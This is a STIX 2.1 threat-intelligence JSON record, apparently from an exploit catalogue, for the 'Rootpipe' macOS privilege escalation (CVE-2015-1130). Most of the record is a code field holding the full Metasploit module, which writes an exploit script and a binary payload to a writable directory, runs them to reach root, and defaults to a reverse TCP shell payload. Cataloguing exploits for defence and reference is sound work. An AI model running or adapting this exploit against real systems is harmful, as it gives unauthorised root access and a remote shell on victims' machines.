{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f065f827-a58b-4ee1-8d82-29e3b604f005",
    "created": "2024-08-14T16:34:40.511207Z",
    "modified": "2024-08-14T16:34:40.511211Z",
    "name": "Apple OS X Rootpipe Privilege Escalation",
    "description": " This module exploits a hidden backdoor API in Apple's Admin framework on Mac OS X to escalate privileges to root, dubbed \"Rootpipe.\"  This module was tested on Yosemite 10.10.2 and should work on previous versions.  The patch for this issue was not backported to older releases.  Note: you must run this exploit as an admin user to escalate to root. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/local/rootpipe.rb",
            "external_id": "rootpipe.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-1130"
        },
        {
            "source_name": "reference",
            "url": "https://truesecdev.wordpress.com/2015/04/09/hidden-backdoor-api-to-root-privileges-in-apple-os-x/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  include Msf::Post::File\n  include Msf::Post::OSX::Priv\n  include Msf::Post::OSX::System\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apple OS X Rootpipe Privilege Escalation',\n      'Description'    => %q{\n        This module exploits a hidden backdoor API in Apple's Admin framework on\n        Mac OS X to escalate privileges to root, dubbed \"Rootpipe.\"\n\n        This module was tested on Yosemite 10.10.2 and should work on previous versions.\n\n        The patch for this issue was not backported to older releases.\n\n        Note: you must run this exploit as an admin user to escalate to root.\n      },\n      'Author'         => [\n        'Emil Kvarnhammar', # Vulnerability discovery and PoC\n        'joev',             # Copy/paste monkey\n        'wvu'               # Meta copy/paste monkey\n      ],\n      'References'     => [\n        ['CVE',   '2015-1130'],\n        ['OSVDB', '114114'],\n        ['EDB',   '36692'],\n        ['URL',   'https://truesecdev.wordpress.com/2015/04/09/hidden-backdoor-api-to-root-privileges-in-apple-os-x/']\n      ],\n      'DisclosureDate' => '2015-04-09',\n      'License'        => MSF_LICENSE,\n      'Platform'       => 'osx',\n      'Arch'           => ARCH_X64,\n      'SessionTypes'   => ['shell'],\n      'Privileged'     => true,\n      'Targets'        => [\n        ['Mac OS X 10.9-10.10.2', {}]\n      ],\n      'DefaultTarget'  => 0,\n      'DefaultOptions' => {\n        'PAYLOAD'         => 'osx/x64/shell_reverse_tcp',\n        'PrependSetreuid' => true\n      }\n    ))\n\n    register_options [\n      OptString.new('PYTHON', [true, 'Python executable', '/usr/bin/python'])\n    ]\n    register_advanced_options [\n      OptString.new('WritableDir', [true, 'Writable directory', '/.Trashes'])\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def check\n    (ver? && is_admin?) ? CheckCode::Appears : CheckCode::Safe\n  end\n\n  def exploit\n    if is_root?\n      fail_with Failure::BadConfig, 'Session already has root privileges'\n    end\n\n    unless is_admin?\n      fail_with Failure::NoAccess, \"User is not in the 'admin' group, bailing.\"\n    end\n\n    if check != CheckCode::Appears\n      fail_with Failure::NotVulnerable, 'Target is not vulnerable'\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    print_status(\"Writing exploit to `#{exploit_file}'\")\n    write_file(exploit_file, python_exploit)\n    register_file_for_cleanup(exploit_file)\n\n    print_status(\"Writing payload to `#{payload_file}'\")\n    write_file(payload_file, binary_payload)\n    register_file_for_cleanup(payload_file)\n\n    print_status('Executing exploit...')\n    cmd_exec(sploit)\n    print_status('Executing payload...')\n    cmd_exec(payload_file)\n  end\n\n  def ver?\n    Rex::Version.new(get_sysinfo['ProductVersion']).between?(\n      Rex::Version.new('10.9'), Rex::Version.new('10.10.2')\n    )\n  end\n\n  def sploit\n    \"#{datastore['PYTHON']} #{exploit_file} #{payload_file} #{payload_file}\"\n  end\n\n  def python_exploit\n    File.read(File.join(\n      Msf::Config.data_directory, 'exploits', 'CVE-2015-1130', 'exploit.py'\n    ))\n  end\n\n  def binary_payload\n    Msf::Util::EXE.to_osx_x64_macho(framework, payload.encoded)\n  end\n\n  def exploit_file\n    @exploit_file ||= \"#{base_dir}/#{Rex::Text.rand_text_alpha(8)}\"\n  end\n\n  def payload_file\n    @payload_file ||= \"#{base_dir}/#{Rex::Text.rand_text_alpha(8)}\"\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-04-09",
    "x_mitre_platforms": [
        "osx'"
    ]
}